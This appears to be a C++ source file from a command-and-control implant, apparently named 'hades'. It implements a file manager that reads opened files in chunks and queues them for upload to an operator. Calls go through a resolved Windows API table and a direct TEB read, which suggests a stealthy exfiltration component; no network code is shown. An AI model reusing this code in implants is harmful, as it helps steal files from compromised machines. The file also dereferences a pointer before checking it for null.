#include "files.hpp"
#include <stdio.h>

BOOL FileMgr::InsertTask(UINT32 TaskID, HANDLE handle) {
    for (FileTasks* cur = this->head; cur != NULL; cur = cur->next) {
        if (cur->TaskID == TaskID) {
            return FALSE;
        }
    }

    FileTasks* task = (FileTasks*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FileTasks));
    if (!task) {
        return FALSE;
    }

    task->TaskID = TaskID;
    task->hProc = handle;
    task->Status = FileOnGoing;

    task->next = this->head;
    this->head = task;

    return TRUE;
}


BOOL FileMgr::ProcessEntry(FileTasks* task) {
    printf("Processing %u\n", task->TaskID);
    if (!task) {
        return TRUE;
    }
    

    if (task->Status == FileDone || task->Status == FileFail ||
        !task->hProc || task->hProc == INVALID_HANDLE_VALUE) {
        return TRUE;
    }

    DWORD BytesRead = 0;
    PBYTE buf = AllocMemory<BYTE>(FILE_CHUNK_SIZE);
   
    if (!hades->WinApis.ReadFile(task->hProc, buf, FILE_CHUNK_SIZE, &BytesRead, NULL)) {
        DWORD err = GetTeb()->LastErrorValue;
        task->Status = FileFail;

        g_ByteMgr->Write4(task->TaskID);
        g_ByteMgr->EndErr(err);

        HeapFree(GetProcessHeap(), 0, buf);
        return TRUE;
    }

    if (BytesRead == 0) {
        task->Status = FileDone;

        HeapFree(GetProcessHeap(), 0, buf);
        return TRUE;
    }

    g_ByteMgr->Write4(task->TaskID);
    g_ByteMgr->Write4(STATUS_OK);
    g_ByteMgr->Write4(TASK_TYPE_UPLOAD);

    if (BytesRead < FILE_CHUNK_SIZE) {
        g_ByteMgr->Write4(UPLOAD_DONE);
        task->Status = FileDone;
    }
    else {
        g_ByteMgr->Write4(UPLOAD_CHUNKED);
    }

    g_ByteMgr->Write4(BytesRead);
    g_ByteMgr->WriteString(buf, BytesRead);

    HeapFree(GetProcessHeap(), 0, buf);

    return task->Status == FileDone;
}


BOOL FileMgr::CheckTasks() {
    FileTasks* prev = NULL;
    FileTasks* cur = this->head;

    while (cur) {
        FileTasks* next = cur->next;
        BOOL remove = this->ProcessEntry(cur);
        if (remove) {
            if (prev) {
                prev->next = next;
            }
            else {
                this->head = next;
            }

            if (cur->hProc && cur->hProc != INVALID_HANDLE_VALUE) {
                hades->WinApis.CloseHandle(cur->hProc);
                cur->hProc = NULL;
            }

            HeapFree(GetProcessHeap(), 0, cur);
        }
        else {
            prev = cur;
        }

        cur = next;
    }


    return TRUE;
}



FileMgr* g_FileMgr = NULL;